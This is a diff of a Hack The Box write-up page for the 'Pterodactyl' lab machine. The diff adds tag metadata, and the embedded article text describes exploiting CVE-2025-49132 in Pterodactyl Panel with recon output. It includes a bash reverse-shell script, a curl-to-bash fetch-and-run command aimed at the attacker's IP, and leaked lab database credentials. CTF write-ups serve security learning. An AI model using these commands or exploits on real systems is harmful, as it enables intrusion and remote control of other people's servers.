@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
 <title>HTB-Pterodactyl | the008Killer</title>
-<meta name="keywords" content="">
+<meta name="keywords" content="HTB, linux, CVE-2025-49132, CVE-2025-6018, CVE-2025-6019, udisks, LPE chains">
 <meta name="description" content="Pterodactyl is a medium linux machine released on 7 Feb 2026 by Headmonitor and TheCyberGeek. This machine runs Pterodactyl Panel which is vulnerable to  CVE-2025-49132, an unauthenticated RCE which leads us to user. And for privilege escalation chaining CVE-2025-6018 and CVE-2025-6019, by forging XDG_SEAT and XDG_VTNR environment variables in .pam_environment user can gain active polkit rights.">
 <meta name="author" content="">
 <link rel="canonical" href="http://localhost:1313/writeups/hackthebox/pterodactyl/">
@@ -79,6 +79,12 @@
     <meta property="article:section" content="writeups">
     <meta property="article:published_time" content="2026-05-18T00:00:00+00:00">
     <meta property="article:modified_time" content="2026-05-18T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="CVE-2025-49132">
+    <meta property="article:tag" content="CVE-2025-6018">
+    <meta property="article:tag" content="CVE-2025-6019">
+    <meta property="article:tag" content="Udisks">
     <meta property="og:image" content="http://localhost:1313/writeups/hackthebox/pterodactyl/writeups/HacktheBox/pterodactyl-cover.png">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://localhost:1313/writeups/hackthebox/pterodactyl/writeups/HacktheBox/pterodactyl-cover.png">
@@ -120,7 +126,7 @@
   "name": "HTB-Pterodactyl",
   "description": "Pterodactyl is a medium linux machine released on 7 Feb 2026 by Headmonitor and TheCyberGeek. This machine runs Pterodactyl Panel which is vulnerable to  CVE-2025-49132, an unauthenticated RCE which leads us to user. And for privilege escalation chaining CVE-2025-6018 and CVE-2025-6019, by forging XDG_SEAT and XDG_VTNR environment variables in .pam_environment user can gain active polkit rights.",
   "keywords": [
-    
+    "HTB", "linux", "CVE-2025-49132", "CVE-2025-6018", "CVE-2025-6019", "udisks", "LPE chains"
   ],
   "articleBody": "🛠 Overview Category\rInfo\rMachine NamePterodactyl\rDifficultyMedium\rRelease Date7 Feb 2026\rAuthorHeadmonitor \u0026 TheCyberGeek\rOSLinux\rPwned Date10 Feb 2026\r1. Reconnaissance Nmap Scan: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6 (protocol 2.0) | ssh-hostkey: | 256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA) |_ 256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519) 80/tcp open http nginx 1.21.5 |_http-server-header: nginx/1.21.5 |_http-title: Did not follow redirect to http://pterodactyl.htb/ 443/tcp closed https 8080/tcp closed http-proxy Scanning for the subdomains we get panel.pterodactyl.htb\n$ ffuf -u http://pterodactyl.htb -H \"Host:FUZZ.pterodactyl.htb\" -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt -t 200 -fs 145 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://pterodactyl.htb :: Wordlist : FUZZ: /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt :: Header : Host: FUZZ.pterodactyl.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 145 ________________________________________________ panel [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 415ms] :: Progress: [100000/100000] :: Job [1/1] :: 675 req/sec :: Duration: [0:01:55] :: Errors: 0 :: Add the IP to /etc/hosts as well as the subdomain\necho ' pterodactyl.htb panel.pterodactyl.htb' | sudo tee -a /etc/hosts The landing page on the website features changelog.txt The changelog discloses the underlying product and its exact version: Pterodactyl Panel v1.11.10 . Using dirsearch to scan for the endpoints\n# Dirsearch started Mon Feb 9 06:54:49 2026 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://pterodactyl.htb/ 403 555B http://pterodactyl.htb/.htaccess.bak1 403 555B http://pterodactyl.htb/.htaccess.save 403 555B http://pterodactyl.htb/.htaccess.sample 403 555B http://pterodactyl.htb/.htaccess.orig 403 555B http://pterodactyl.htb/.htaccess_extra 403 555B http://pterodactyl.htb/.htaccess_orig 403 555B http://pterodactyl.htb/.htaccess_sc 403 555B http://pterodactyl.htb/.ht_wsr.txt 403 555B http://pterodactyl.htb/.htaccessOLD2 403 555B http://pterodactyl.htb/.htm 403 555B http://pterodactyl.htb/.htaccessOLD 403 555B http://pterodactyl.htb/.html 403 555B http://pterodactyl.htb/.htaccessBAK 403 555B http://pterodactyl.htb/.httr-oauth 403 555B http://pterodactyl.htb/.htpasswds 403 555B http://pterodactyl.htb/.htpasswd_test 200 920B http://pterodactyl.htb/changelog.txt 200 72KB http://pterodactyl.htb/phpinfo.php 403 555B http://pterodactyl.htb/Public/ There is phpinfo.php exposed which contains full configurations for the site. Looking at panel.pterodactyl.htb we have a login page: 2. Foothold Searching for CVEs for Pterodactyl Panel v1.11.10 we came across CVE-2025-49132, unauthenticated RCE. Using the /locales/locale.json with the locale and namespace query parameters, a malicious actor is able to execute arbitrary code, without being authenticated. To execute our payload we have to include pearcmd.php\nExploring the CVEs we came across this in Exploit-DB\npython3 exploit.py http://panel.pterodactyl.htb/ http://panel.pterodactyl.htb/ =\u003e pterodactyl:PteraPanel@127.0.0.1:3306/panel This confirms panel is vulnerable and we get MySQL credentials as well pterodactyl:PteraPanel. Now exploring for RCE came across this 0xtensho/CVE-2025-4912-poc but edit the path for the pearcmd.php\n# Old: locale=../../../../../usr/local/lib/php\u0026namespace=pearcmd\r# New: locale=../../../../../usr/share/php/PEAR\u0026namespace=pearcmd $ cat shell.sh #!/bin/bash /bin/bash -i \u003e\u0026 /dev/tcp/10.10.14.54/1337 0\u003e\u00261 $ python3 -m http.server 80 $ python3 poc.py panel.pterodactyl.htb \"curl 10.10.14.54/shell.sh|bash\" We get a shell:\n$ rlwrap nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.9] from (UNKNOWN) [10.129.230.200] 48726 bash: cannot set terminal process group (1208): Inappropriate ioctl for device bash: no job control in this shell wwwrun@pterodactyl:/var/www/pterodactyl/public\u003e 3. Lateral Movement We have the credentials for the sql server, we use it:\nwwwrun@pterodactyl:/var/www/pterodactyl/public\u003e mariadb -u pterodactyl -h 127.0.0.1 -pPteraPanel -e \"SHOW DATABASES;\" ",
   "wordCount" : "1258",
@@ -534,6 +540,13 @@ The exploit leverages the Filesystem.Resize D-Bus method. During resize, UDisks2
 
   <footer class="post-footer">
     <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/htb/">HTB</a></li>
+      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
+      <li><a href="http://localhost:1313/tags/cve-2025-49132/">CVE-2025-49132</a></li>
+      <li><a href="http://localhost:1313/tags/cve-2025-6018/">CVE-2025-6018</a></li>
+      <li><a href="http://localhost:1313/tags/cve-2025-6019/">CVE-2025-6019</a></li>
+      <li><a href="http://localhost:1313/tags/udisks/">Udisks</a></li>
+      <li><a href="http://localhost:1313/tags/lpe-chains/">LPE Chains</a></li>
     </ul>
 <nav class="paginav">
   <a class="prev" href="http://localhost:1313/writeups/hackthebox/interpreter/">
